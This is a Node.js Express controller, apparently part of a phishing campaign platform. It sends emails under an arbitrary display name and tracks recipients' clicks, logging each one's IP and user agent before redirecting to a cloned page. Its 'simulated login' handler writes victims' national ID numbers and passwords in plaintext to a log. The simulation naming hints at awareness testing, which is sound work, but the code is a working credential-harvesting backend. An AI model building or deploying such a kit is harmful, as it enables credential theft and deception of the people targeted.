import fs from "fs";
import path from "path";
import { fileURLToPath } from 'url';
import { dirname } from 'path';
import { HOST, PORT } from "../config/configEnv.js";
import { emailConfig } from "../config/configEnv.js";
import { sendEmail } from "../services/email.service.js";
import { AppDataSource } from '../config/configDb.js';
import CampaignSchema from '../entity/campaign.entity.js';
import {
    handleErrorServer,
    handleSuccess,
    } from "../handlers/responseHandlers.js";

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

export const sendCustomEmail = async (req, res) => {

    const { email, subject, message, fromName } = req.body;

    const sender = `"${fromName}" <${emailConfig.user}>`;

    const campaignId = "camp1";
    const userId = encodeURIComponent(email);

    const trackingLink = `http://${HOST}:${PORT}/api/email/track/${campaignId}/${userId}`;

    const htmlMessage = `
        <p>${message}</p>
        `;
        /* <p><a href="${trackingLink}">Haz clic aquí para revisar</a></p> */

    try {
        const info = await sendEmail(
            sender,
            email,
            subject,
            message,
            htmlMessage
        );

        handleSuccess(res, 200, "Correo enviado con exito!!", info);

    } catch (error) {

        handleErrorServer(res, 500, "Error durante el envío del correo", error.message);
        
    }

}

export const trackClick = (req, res) => {
    const { campaignId, userId } = req.params;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const timestamp = new Date().toISOString();

    const logLine = `${timestamp} | Campaign: ${campaignId} | User: ${userId} | IP: ${ip} | Agent: ${userAgent}\n`;

    const logPath = path.resolve("logs", "clicks.log");

    fs.mkdirSync("logs", { recursive: true });

    fs.appendFile(logPath, logLine, async (err) => {
        if (err) {
            console.error("Error al registrar clic:", err);  
        } else {

            console.log("Click registrado!!");
            console.log("^^^^^^^^^^^^^^^^^^^^^^");
            console.log(logLine);
            console.log("^^^^^^^^^^^^^^^^^^^^^^");

            try {
                const campaignRepository = AppDataSource.getRepository(CampaignSchema.options.name);
                // campaignId viene de la URL, que es el 'name' de la página clonada
                const campaign = await campaignRepository.findOne({ where: { campaignName: campaignId } });

                if (campaign) {
                    campaign.clicked += 1; // Incrementar el contador de clics
                    await campaignRepository.save(campaign);
                    console.log(`Clic registrado para la campaña '${campaignId}'. Total clics: ${campaign.clicked}`);
                } else {
                    console.warn(`Campaña con nombre '${campaignId}' no encontrada para actualizar clics.`);
                }
            } catch (dbError) {
                console.error("Error al actualizar el contador de clics en la DB:", dbError);
            }

        }
    });

    const redirectURL = `http://${HOST}:1607/${campaignId}/index.html`;
    res.redirect(redirectURL);
};

export const simularLogin = (req, res) => {
    const { rut, password } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const agent = req.headers['user-agent'];
    const timestamp = new Date().toISOString();

    const logLine = `${timestamp} | [LOGIN SIMULADO] RUT: ${rut} | PASS: ${password} | IP: ${ip} | Agent: ${agent}\n`;

    const logPath = path.resolve(__dirname, "../../logs/clicks.log");


    fs.appendFile(logPath, logLine, (err) => {
        if (err) {
            console.error("Error al registrar login u.u :", err);
            return res.status(500).json({ error: "Error al registrar" });
        }

        console.log("Login registrado:");
        console.log(logLine);
        res.status(200).json({ success: true });
    });
};
